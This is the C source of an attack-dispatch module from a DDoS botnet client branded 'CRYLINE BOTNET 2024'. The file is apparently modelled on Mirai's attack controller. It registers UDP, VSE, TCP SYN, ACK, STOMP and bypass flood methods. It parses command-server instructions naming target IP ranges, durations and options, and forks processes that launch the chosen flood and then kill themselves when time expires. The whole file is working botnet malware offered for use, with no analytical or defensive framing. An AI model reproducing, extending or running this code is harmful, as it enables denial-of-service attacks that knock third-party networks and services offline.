/* 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
*/

#define _GNU_SOURCE

#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

#include "LIBRARIES.h"
#include "RANDOM_GENERATOR.h"
#include "CUSTOM_FUNCTIONS.h"
#include "ATTACKS_CONTROLLER.h"

uint8_t __METHODS_LENGHT = 0;
struct __METHOD **_METHODS = NULL;

__GET_BOOL __INIT(void)
{
    __ADD(0, (ATTACK_FUNC)__UDP_GENERIC_ATTACK);
    __ADD(1, (ATTACK_FUNC)__UDP_VSE_ATTACK);
    __ADD(2, (ATTACK_FUNC)__TCP_SYN_ATTACK);
    __ADD(3, (ATTACK_FUNC)__TCP_ACK_ATTACK);
    __ADD(4, (ATTACK_FUNC)__TCP_STOMP_ATTACK);
    __ADD(5, (ATTACK_FUNC)__UDP_PLAIN_ATTACK);
    __ADD(6, (ATTACK_FUNC)__TCP_SOCKET_ATTACK);
    __ADD(7, (ATTACK_FUNC)__UDP_BYPASS_ATTACK);

    return 1;
}

void __PARSE(char *_BUFFER, int _LENGHT)
{
    int GET_COUNTER;

    uint32_t _DURATION;

    _ATTACK_VECTOR _VECTOR;

    uint8_t TARGETS_LENGHT, _OPTS_LENGHT;
    struct __TARGET *_TARGETS = NULL;
    struct __OPTION *_OPTS = NULL;

    if (_LENGHT < sizeof(uint32_t))
    {
        goto __CLEAN;
    }

    _DURATION = ntohl(*((uint32_t *)_BUFFER));

    _BUFFER += sizeof(uint32_t);
    _LENGHT -= sizeof(uint32_t);

    if (_LENGHT == 0)
    {
        goto __CLEAN;
    }

    _VECTOR = (_ATTACK_VECTOR)*_BUFFER++;
    _LENGHT -= sizeof(uint8_t);

    if (_LENGHT == 0)
    {
        goto __CLEAN;
    }

    TARGETS_LENGHT = (uint8_t)*_BUFFER++;
    _LENGHT -= sizeof(uint8_t);

    if (TARGETS_LENGHT == 0)
    {
        goto __CLEAN;
    }

    if (_LENGHT < ((sizeof(__IPV4) + sizeof(uint8_t)) * TARGETS_LENGHT))
    {
        goto __CLEAN;
    }

    _TARGETS = calloc(TARGETS_LENGHT, sizeof(struct __TARGET));

    for (GET_COUNTER = 0; GET_COUNTER < TARGETS_LENGHT; GET_COUNTER++)
    {
        _TARGETS[GET_COUNTER]._ADDRESS = *((__IPV4 *)_BUFFER);

        _BUFFER += sizeof(__IPV4);

        _TARGETS[GET_COUNTER]._NETMASK = (uint8_t)*_BUFFER++;

        _LENGHT -= (sizeof(__IPV4) + sizeof(uint8_t));

        _TARGETS[GET_COUNTER]._SOCK_ADDRESS.sin_family = AF_INET;
        _TARGETS[GET_COUNTER]._SOCK_ADDRESS.sin_addr.s_addr = _TARGETS[GET_COUNTER]._ADDRESS;
    }

    if (_LENGHT < sizeof(uint8_t))
    {
        goto __CLEAN;
    }

    _OPTS_LENGHT = (uint8_t)*_BUFFER++;
    _LENGHT -= sizeof(uint8_t);

    if (_OPTS_LENGHT > 0)
    {
        _OPTS = calloc(_OPTS_LENGHT, sizeof(struct __OPTION));

        for (GET_COUNTER = 0; GET_COUNTER < _OPTS_LENGHT; GET_COUNTER++)
        {
            uint8_t VALUE_LENGHT;

            if (_LENGHT < sizeof(uint8_t))
            {
                goto __CLEAN;
            }

            _OPTS[GET_COUNTER]._KEY = (uint8_t)*_BUFFER++;
            _LENGHT -= sizeof(uint8_t);

            if (_LENGHT < sizeof(uint8_t))
            {
                goto __CLEAN;
            }

            VALUE_LENGHT = (uint8_t)*_BUFFER++;
            _LENGHT -= sizeof(uint8_t);

            if (_LENGHT < VALUE_LENGHT)
            {
                goto __CLEAN;
            }

            _OPTS[GET_COUNTER]._VALUE = calloc(VALUE_LENGHT + 1, sizeof(char));
            __MEMCPY(_OPTS[GET_COUNTER]._VALUE, _BUFFER, VALUE_LENGHT);

            _BUFFER += VALUE_LENGHT;
            _LENGHT -= VALUE_LENGHT;
        }
    }

    __START(_DURATION, _VECTOR, TARGETS_LENGHT, _TARGETS, _OPTS_LENGHT, _OPTS);

    __CLEAN:
    if (_TARGETS != NULL)
    {
        free(_TARGETS);
    }
    if (_OPTS != NULL)
    {
        __FREE_OPTS(_OPTS, _OPTS_LENGHT);
    }
}

void __START(int _DURATION, _ATTACK_VECTOR _VECTOR, uint8_t TARGETS_LENGHT, struct __TARGET *_TARGETS, uint8_t _OPTS_LENGHT, struct __OPTION *_OPTS)
{
    int PID_1, PID_2;

    PID_1 = fork();

    if (PID_1 == -1 || PID_1 > 0)
    {
        return;
    }

    PID_2 = fork();

    if (PID_2 == -1)
    {
        exit(0);
    }

    else if (PID_2 == 0)
    {
        sleep(_DURATION);

        kill(getppid(), 9);

        exit(0);
    }
    else
    {
        int GET_COUNTER;

        for (GET_COUNTER = 0; GET_COUNTER < __METHODS_LENGHT; GET_COUNTER++)
        {
            if (_METHODS[GET_COUNTER]->_VECTOR == _VECTOR)
            {
                _METHODS[GET_COUNTER]->_FUNCTION(TARGETS_LENGHT, _TARGETS, _OPTS_LENGHT, _OPTS);
                break;
            }
        }
        exit(0);
    }
}

char *__GET_OPT_STRING(uint8_t _OPTS_LENGHT, struct __OPTION *_OPTS, uint8_t _OPT, char *_DEF)
{
    int GET_COUNTER;

    for (GET_COUNTER = 0; GET_COUNTER < _OPTS_LENGHT; GET_COUNTER++)
    {
        if (_OPTS[GET_COUNTER]._KEY == _OPT)
        {
            return _OPTS[GET_COUNTER]._VALUE;
        }
    }
    return _DEF;
}

int __GET_OPT_INT(uint8_t _OPTS_LENGHT, struct __OPTION *_OPTS, uint8_t _OPT, int _DEF)
{
    char *_VALUE = __GET_OPT_STRING(_OPTS_LENGHT, _OPTS, _OPT, NULL);

    if (_VALUE == NULL)
    {
        return _DEF;
    }
    else
    {
        return __ATOI(_VALUE, 10);
    }
}

uint32_t __GET_OPT_IP(uint8_t _OPTS_LENGHT, struct __OPTION *_OPTS, uint8_t _OPT, uint32_t _DEF)
{
    char *_VALUE = __GET_OPT_STRING(_OPTS_LENGHT, _OPTS, _OPT, NULL);

    if (_VALUE == NULL)
    {
        return _DEF;
    }
    else
    {
        return inet_addr(_VALUE);
    }
}

static void __ADD(_ATTACK_VECTOR _VECTOR, ATTACK_FUNC _FUNCTION)
{
    struct __METHOD *METHOD = calloc(1, sizeof(struct __METHOD));

    METHOD->_VECTOR = _VECTOR;
    METHOD->_FUNCTION = _FUNCTION;

    _METHODS = realloc(_METHODS, (__METHODS_LENGHT + 1) * sizeof(struct __METHOD *));
    _METHODS[__METHODS_LENGHT++] = METHOD;
}

static void __FREE_OPTS(struct __OPTION *_OPTS, int _LENGHT)
{
    int GET_COUNTER;

    if (_OPTS == NULL)
    {
        return;
    }

    for (GET_COUNTER = 0; GET_COUNTER < _LENGHT; GET_COUNTER++)
    {
        if (_OPTS[GET_COUNTER]._VALUE != NULL)
        {
            free(_OPTS[GET_COUNTER]._VALUE);
        }
    }
    free(_OPTS);
}
